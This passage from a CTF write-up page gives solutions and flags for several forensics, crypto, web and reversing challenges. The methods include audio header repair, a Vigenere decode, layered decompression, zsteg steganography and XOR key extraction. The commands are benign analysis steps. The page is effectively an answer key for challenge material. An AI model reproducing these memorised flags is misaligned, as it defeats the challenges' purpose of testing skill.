</pre></table></code></div></div><hr /><h2> Flag</h2><code> CYS{SEAL_RAID_CROSS_MAAT_MAZE_HODOS} </code><hr><h1 id="choir-echoes"> Choir Echoes <a href="/writeups/FinalTrace_2025/39-choir-echoes.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="choir-echoes">Choir Echoes</h1><ul><li><strong>Category</strong>: [Forensics]<li><strong>Author</strong>: [ace6002]<li><strong>Level</strong>: [Medium]</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Audio Forensics.</p><h2 id="question-to-be-given"><span class="mr-2">Question to be given</span><a href="#question-to-be-given" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>You could not live with your own failures. Where did that bring you? Back to the beginning. Wear your spectacles better, perhaps you'll succeed this time.
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>[Audacity]<li>[Hexedit]</ul><h4 id="step-1-hexedit-given-wav-file-correct-the-headers-from-kafx-to-riff-and-waww-to-wave"><span class="mr-2">Step 1: Hexedit given .wav file, correct the headers from KaFX to RIFF and WAWW to WAVE.</span><a href="#step-1-hexedit-given-wav-file-correct-the-headers-from-kafx-to-riff-and-waww-to-wave" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><h4 id="step-2-read-the-file-using-audacity-spectrography-to-find-the-key-but-this-is-not-the-flag-its-simply-the-key-of-a-vigenere-cipher"><span class="mr-2">Step 2: Read the file using audacity spectrography to find the key. But this is not the flag, its simply the key of a Vigenere Cipher.</span><a href="#step-2-read-the-file-using-audacity-spectrography-to-find-the-key-but-this-is-not-the-flag-its-simply-the-key-of-a-vigenere-cipher" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><h4 id="step-3-the-tail-of-the-file-excellentewav-contains-the-encoded-text-tce1rrp1ml0-"><span class="mr-2">Step 3: The tail of the file <code class="language-plaintext highlighter-rouge">excellente!.wav</code> contains the encoded text <code class="language-plaintext highlighter-rouge">TCE{1rrp1ml0}</code> .</span><a href="#step-3-the-tail-of-the-file-excellentewav-contains-the-encoded-text-tce1rrp1ml0-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><h4 id="step-4-decode-vigenere-using-key-remy-obtained-from-spectral-view-to-get-flag-cys1tal1an0"><span class="mr-2">Step 4: Decode Vigenere using key <code class="language-plaintext highlighter-rouge">remy</code> obtained from spectral view to get flag <code class="language-plaintext highlighter-rouge">CYS{1tal1an0}</code>.</span><a href="#step-4-decode-vigenere-using-key-remy-obtained-from-spectral-view-to-get-flag-cys1tal1an0" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><h3 id="flag-1"><span class="mr-2">Flag 1</span><a href="#flag-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{1tal1an0}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{1tal1an0} </code><hr><h1 id="reflection-logs"> Reflection Logs <a href="/writeups/FinalTrace_2025/40-reflection-logs.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="reflection-logs"><span class="mr-2">Reflection Logs</span><a href="#reflection-logs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category</strong>: Forensics<li><strong>Author</strong>: Rithvik</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A fragment of Lyra’s message is buried under multiple layers of compression and presented as a hexdump (<code class="language-plaintext highlighter-rouge">tryme.hex</code>, xxd format, ASCII column included). Players must reverse the hexdump, identify the gzip layer, decompress it to reveal a bzip2 file, and then decompress that to recover a text file encoded twice in Base64. Decoding it twice reveals the final flag.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The provided file is a plain-text hexdump generated by <code class="language-plaintext highlighter-rouge">xxd</code>, which includes both hexadecimal bytes and an ASCII column. This indicates the original content is binary data encoded as text. The job is to reverse the hexdump to its binary form and peel back compression layers until the Base64 text is reached.</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><code class="language-plaintext highlighter-rouge">xxd</code> (to reverse the hexdump)<li><code class="language-plaintext highlighter-rouge">file</code> (to inspect file types via magic bytes)<li><code class="language-plaintext highlighter-rouge">gunzip</code> / <code class="language-plaintext highlighter-rouge">gzip -d</code> (to decompress gzip archives)<li><code class="language-plaintext highlighter-rouge">bunzip2</code> (to decompress bzip2 archives)<li><code class="language-plaintext highlighter-rouge">base64</code> (to decode the encoded text)</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-reconstruct-the-binary-from-the-hexdump"><span class="mr-2">Step 1: Reconstruct the binary from the hexdump</span><a href="#step-1-reconstruct-the-binary-from-the-hexdump" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>xxd -r tryme.hex &gt; stage0.bin
file stage0.bin
</pre></table></code></div></div><p><strong>What this does:</strong> <code class="language-plaintext highlighter-rouge">xxd -r</code> converts the textual hexdump back into the original binary file. Running <code class="language-plaintext highlighter-rouge">file</code> on the result reveals the binary’s type by checking magic bytes.</p><p><strong>Expected output:</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>stage0.bin: gzip compressed data, from Unix, last modified: ...
</pre></table></code></div></div><h4 id="step-2-decompress-the-gzip-layer"><span class="mr-2">Step 2: Decompress the gzip layer</span><a href="#step-2-decompress-the-gzip-layer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre># Option A — rename then gunzip (safe and explicit)
mv stage0.bin stage0.gz
gunzip stage0.gz
# This produces 'stage0' (or the original filename stored inside the archive)

# Option B — decompress without renaming
gzip -dc stage0.bin &gt; stage1.bz2
</pre></table></code></div></div><p><strong>What this does:</strong> The gzip layer contains a <code class="language-plaintext highlighter-rouge">.bz2</code> file. After decompression you should have the bzip2 file (e.g., <code class="language-plaintext highlighter-rouge">stage1.bz2</code>).</p><p><strong>Verification:</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>file stage1.bz2
# Expected: stage1.bz2: bzip2 compressed data, ...
</pre></table></code></div></div><h4 id="step-3-decompress-the-bzip2-file-to-get-the-base64-text"><span class="mr-2">Step 3: Decompress the bzip2 file to get the Base64 text</span><a href="#step-3-decompress-the-bzip2-file-to-get-the-base64-text" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>bunzip2 stage1.bz2
# Produces an ASCII text file (e.g., 'stage1.txt')
file stage1.txt
head -n 5 stage1.txt
</pre></table></code></div></div><p><strong>What this does:</strong> <code class="language-plaintext highlighter-rouge">bunzip2</code> extracts the text file that contains the Base64-encoded flag (encoded twice).</p><h4 id="step-4-decode-the-base64-text-twice"><span class="mr-2">Step 4: Decode the Base64 text twice</span><a href="#step-4-decode-the-base64-text-twice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cat stage1.txt | base64 -d | base64 -d &gt; flag.txt
cat flag.txt
</pre></table></code></div></div><p><strong>What this does:</strong> The text is decoded twice using <code class="language-plaintext highlighter-rouge">base64 -d</code>. The final output reveals the hidden flag.</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{lyra_was_here}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{lyra_was_here} </code><hr><h1 id="auditor-encounter"> Auditor Encounter <a href="/writeups/FinalTrace_2025/41-challenge-name.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><ul><li><strong>Category</strong>: Web / ARG<li><strong>Author</strong>: Oviya</ul><hr /><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this challenge, you encounter <strong>The Auditor</strong>, a mysterious entity that reviews your actions in the fractured timeline.<br /> Through an interactive dialogue, you must respond to his questions about your past interference in the archive.<br /> Each response leads to a different outcome — hidden clues, distinct checksums, and unique session identifiers, all combining to form your final flag.</p><p>The true test lies in observation and deduction — the data is never handed over directly, but concealed cleverly in the background.</p><hr /><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>On opening the webpage, the interface shows <strong>The Auditor</strong>, who initiates a conversation in a typewriter-style effect.<br /> After a few exchanges, the player is presented with <strong>four choices</strong>, each representing a possible action from the past.</p><p>Inspecting the code reveals a <code class="language-plaintext highlighter-rouge">fetch()</code> request silently retrieving a hidden resource (which in this case is disguised or embedded), and a <strong>flag format</strong> hint inside the script logic.</p><p>The flag format is: CYS{audit_recovered_<checksum>_<sessionid>} ---</sessionid></checksum></p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Web Browser (Developer Tools → Network &amp; Sources)<li>Basic JavaScript inspection<li>Notepad / VS Code for viewing HTML source</ul><hr /><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-observation-and-interaction"><span class="mr-2">Step 1: Observation and Interaction</span><a href="#step-1-observation-and-interaction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>When the page loads, <strong>The Auditor</strong> introduces the scenario and begins questioning your actions.<br /> Once prompted, four choices appear, each corresponding to a distinct decision path.</p><h4 id="step-2-inspecting-the-network-or-script"><span class="mr-2">Step 2: Inspecting the Network or Script</span><a href="#step-2-inspecting-the-network-or-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Upon selecting any choice, no flag is directly revealed.<br /> However, by checking the <strong>Developer Tools → Sources or Network tab</strong>, you can find that the hidden clue is retrieved or encoded within the script itself.<br /> Each path outputs a <strong>checksum</strong> and <strong>sessionID</strong> that you must fit into the given flag format.</p><h4 id="step-3-reconstructing-the-flag"><span class="mr-2">Step 3: Reconstructing the Flag</span><a href="#step-3-reconstructing-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Using the format and the given data, you reconstruct your flag as: CYS{audit_recovered_<checksum>_<sessionid>} ---</sessionid></checksum></p><h3 id="path-outcomes-and-flags"><span class="mr-2">Path Outcomes and Flags</span><a href="#path-outcomes-and-flags" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Each decision leads to a unique audit result with a distinct checksum and session ID.<br /> These combine to form four valid flags depending on the path you choose:</p><div class="table-wrapper"><table><thead><tr><th><strong>Choice</strong><th><strong>Description</strong><th><strong>Checksum</strong><th><strong>SessionID</strong><th><strong>Final Flag</strong><tbody><tr><td><strong>Path A</strong><td>“I repaired corrupted echoes — I tried to restore what was lost.”<td><code class="language-plaintext highlighter-rouge">1A3F</code><td><code class="language-plaintext highlighter-rouge">07XZ</code><td><code class="language-plaintext highlighter-rouge">CYS{audit_recovered_1A3F_07XZ}</code><tr><td><strong>Path B</strong><td>“I smashed the capsules — they were unstable and had to be purged.”<td><code class="language-plaintext highlighter-rouge">B2D4</code><td><code class="language-plaintext highlighter-rouge">9KLM</code><td><code class="language-plaintext highlighter-rouge">CYS{audit_recovered_B2D4_9KLM}</code><tr><td><strong>Path C</strong><td>“I reconfigured terminals to read restricted vaults — truth needed access.”<td><code class="language-plaintext highlighter-rouge">C3E7</code><td><code class="language-plaintext highlighter-rouge">Q4T1</code><td><code class="language-plaintext highlighter-rouge">CYS{audit_recovered_C3E7_Q4T1}</code><tr><td><strong>Path D</strong><td>“I observed only. I let the archive run its course.”<td><code class="language-plaintext highlighter-rouge">D4F9</code><td><code class="language-plaintext highlighter-rouge">Z0OP</code><td><code class="language-plaintext highlighter-rouge">CYS{audit_recovered_D4F9_Z0OP}</code></table></div><hr /><h3 id="explanation-of-paths"><span class="mr-2">Explanation of Paths</span><a href="#explanation-of-paths" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Each path represents a <strong>different moral response</strong> to the Auditor’s inquiry.<li>The <strong>checksum</strong> and <strong>sessionID</strong> act as identifiers for the version of the timeline recovered.<li>These unique flags determine which branch of the overarching story or challenge you progress into next.</ul><hr /><h3 id="flag-example"><span class="mr-2">Flag Example</span><a href="#flag-example" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If the player selects the first option: CYS{audit_recovered_1A3F_07XZ} —</p><h2> Flag</h2><code> CYS{audit_recovered_1A3F_07XZ} </code><hr><h1 id="cryptoez"> CryptoEZ <a href="/writeups/FinalTrace_2025/42-cryptoez.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="cryptoez">CryptoEZ</h1><p><strong>Category</strong>: Cryptography<br /> <strong>Author</strong>: Abhay Krishna</p><hr /><p><em>This challenge explores the basics of image cryptography with basic concepts like <code class="language-plaintext highlighter-rouge">EXIF metadata</code> and <code class="language-plaintext highlighter-rouge">steganography</code></em></p><hr /><h2 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>As the description suggests there is something hidden inside the message it is very common and basic to view the metadata of the Image.</p><hr /><h2 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Online EXIF data viewer<li>Zsteg</ul><hr /><h2 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="step-1-check-exif-metadata"><span class="mr-2">Step 1: Check EXIF Metadata</span><a href="#step-1-check-exif-metadata" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>On viewing the metadata of the image we can see a hint saying <em>“Listen to the least significant whispers”</em>. This indicates the use of <strong>LSB steganography</strong> - a technique for hiding secret data by replacing the least significant bits (LSBs) of a carrier file, like an image, with the bits of the hidden message.</p><h3 id="step-2-use-steganography-tools"><span class="mr-2">Step 2: Use Steganography Tools</span><a href="#step-2-use-steganography-tools" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>To solve this we can use tools like <code class="language-plaintext highlighter-rouge">zsteg</code> which is used for detecting and extracting steganographic data from images.</p><h3 id="step-3-extract-hidden-data"><span class="mr-2">Step 3: Extract Hidden Data</span><a href="#step-3-extract-hidden-data" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>On running the command: ```shell zsteg flag.png</p><p>b1,r,lsb,xy .. text: “&lt;~^#vS\p” b1,g,msb,xy .. file: OpenPGP Secret Key b1,rgb,lsb,xy .. text: “CYS{y0u_kn0w_cryp70}” b4,r,lsb,xy .. text: “vU"#4"$DDDD3#C2 “ b4,g,lsb,xy .. text: “##DEEVfeef” b4,b,lsb,xy .. text: “"3EUUUEEEEfw” b4,rgb,lsb,xy .. text: “`U’rw’rw’qf” b4,bgr,lsb,xy .. text: “Pw’rw’rw&amp;af”</p><hr /><h2 id="flag"><span class="mr-2">Flag:</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>CYS{y0u_kn0w_cryp70}</ul><hr /><h2> Flag</h2><code> CYS{y0u_kn0w_cryp70} </code><hr><h1 id="lyra-s-journal"> Lyra's Journal <a href="/writeups/FinalTrace_2025/43-challenge-description.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><ul><li><strong>Category</strong>: [Forensics]<li><strong>Author:</strong> [Nihara Oommen]</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>[There are 15 such fragments scattered across files. Each fragment is appended into some of the JPEG files as plain ASCII in the raw bytes in the form <code class="language-plaintext highlighter-rouge">CYS{fragment} YYYY-MM-DDTHH:MM:SS</code>. Sorting the found fragments by timestamp reveals the final flag.]</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>[I inspected the provided files and the generator script. The images looked normal in viewers, so I suspected the fragments were embedded in the raw file bytes (not visible pixels). The pattern <code class="language-plaintext highlighter-rouge">CYS{</code> suggested a simple ASCII string was appended to some JPEG files.]</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><code class="language-plaintext highlighter-rouge">Select-String</code> (PowerShell)<li><code class="language-plaintext highlighter-rouge">sort-object</code> (PowerShell)<li><code class="language-plaintext highlighter-rouge">unzip</code> (to extract the challenge ZIP)<li><code class="language-plaintext highlighter-rouge">PowerShell</code><li><code class="language-plaintext highlighter-rouge">Python</code> (optional, for automation)</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-extract-the-files"><span class="mr-2">Step 1: Extract the files</span><a href="#step-1-extract-the-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>tar -xf journal_pages.zip
</pre></table></code></div></div><p>Extracts all <code class="language-plaintext highlighter-rouge">page_###.jpg</code> into <code class="language-plaintext highlighter-rouge">journal_pages/</code> for inspection.</p><h4 id="step-2-find-the-hidden-fragments"><span class="mr-2">Step 2: Find the hidden fragments</span><a href="#step-2-find-the-hidden-fragments" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Select-String -Path .\journal_pages\*.jpg -Pattern "CYS{" | ForEach-Object { $_.Line }
</pre></table></code></div></div><p>This finds lines like:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>CYS{T} 2087-09-22T00:12:00
CYS{H} 2087-09-22T00:21:00
...
</pre></table></code></div></div><p>(Each hit is the fragment plus its timestamp.)</p><h4 id="step-3-sort-fragments-by-timestamp-and-assemble-the-flag"><span class="mr-2">Step 3: Sort fragments by timestamp and assemble the flag</span><a href="#step-3-sort-fragments-by-timestamp-and-assemble-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>Select-String -Path .\journal_pages\*.jpg -Pattern "CYS{" | ForEach-Object {
    $line = $_.Line
    if ($line -match "CYS\{([^}]+)\}\s*([0-9T:-]+)") {
        [PSCustomObject]@{ Fragment = $matches[1]; Timestamp = [datetime]::ParseExact($matches[2],"yyyy-MM-ddTHH:mm:ss",$null) }
    }
} | Sort-Object Timestamp | ForEach-Object { $_.Fragment } &gt; sorted_fragments.txt
</pre></table></code></div></div><p>Explanation: after sorting by the ISO timestamps, concatenating the fragments in order reconstructs the inner flag message.</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{THE_CLOCKS_WERE_LYING}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{THE_CLOCKS_WERE_LYING} </code><hr><h1 id="echo-double-combat"> Echo-Double Combat <a href="/writeups/FinalTrace_2025/44-echo-double-combat.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="echo-double-combat"><span class="mr-2">Echo-Double Combat</span><a href="#echo-double-combat" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category</strong>: Reverse Engineering<li><strong>Author</strong>: Suraj Kumar</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A binary executable accepts a 9-character input key and validates it through XOR operations. The correct key is encoded in the binary and must be extracted by XORing stored bytes with <code class="language-plaintext highlighter-rouge">0x55</code>. Once the correct key is entered, the binary decrypts and reveals the flag using repeating-key XOR. A decoy flag is stored in encrypted form as a Base64 string (<code class="language-plaintext highlighter-rouge">WTNsemUyY3dYMkkwWTJ0ZmREQmZjM1EwY25SemZRPT0=</code>) in the binary’s strings, which decodes to <code class="language-plaintext highlighter-rouge">cys{g0_b4ck_t0_st4rts}</code> — this is intentionally wrong and serves as a red herring.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Running basic reconnaissance on the binary revealed an encrypted decoy flag in the strings output. Further analysis required disassembling the binary to understand the validation logic and extract the encoded key array used for XOR operations.</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Ghidra / IDA Pro / Binary Ninja<li>strings, file, objdump, readelf<li>Python 3<li>base64 (command-line tool)<li>GCC</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-initial-analysis"><span class="mr-2">Step 1: Initial Analysis</span><a href="#step-1-initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>file challenge.dat
strings challenge.dat
</pre></table></code></div></div><p>Found a Base64-encoded string <code class="language-plaintext highlighter-rouge">WTNsemUyY3dYMkkwWTJ0ZmREQmZjM1EwY25SemZRPT0=</code>. Decoding it twice reveals <code class="language-plaintext highlighter-rouge">cys{g0_b4ck_t0_st4rts}</code> which is a decoy flag (intentionally wrong). The binary requires a 9-character key as input.</p><h4 id="step-2-decode-the-decoy-red-herring"><span class="mr-2">Step 2: Decode the Decoy (Red Herring)</span><a href="#step-2-decode-the-decoy-red-herring" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"WTNsemUyY3dYMkkwWTJ0ZmREQmZjM1EwY25SemZRPT0="</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">base64</span> <span class="nt">-d</span>
<span class="c"># Output: cys{g0_b4ck_t0_st4rts}</span>
</pre></table></code></div></div><p>This decoy flag is not the answer and will fail if used as input. It exists to mislead players who rely only on strings output.</p><h4 id="step-3-extract-encoded-arrays-from-binary"><span class="mr-2">Step 3: Extract Encoded Arrays from Binary</span><a href="#step-3-extract-encoded-arrays-from-binary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>objdump <span class="nt">-s</span> <span class="nt">-j</span> .data challenge.dat
<span class="c"># or</span>
readelf <span class="nt">-x</span> .data challenge.dat
</pre></table></code></div></div><p>Located two arrays in the <code class="language-plaintext highlighter-rouge">.data</code> section:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>key_enc:  34 39 3a 3d 3a 38 3a 27 34
flag_enc: 12 5f 0c 1a 5c 19 30 43 12 3e 19 01 59 5f 0e 04 17 05
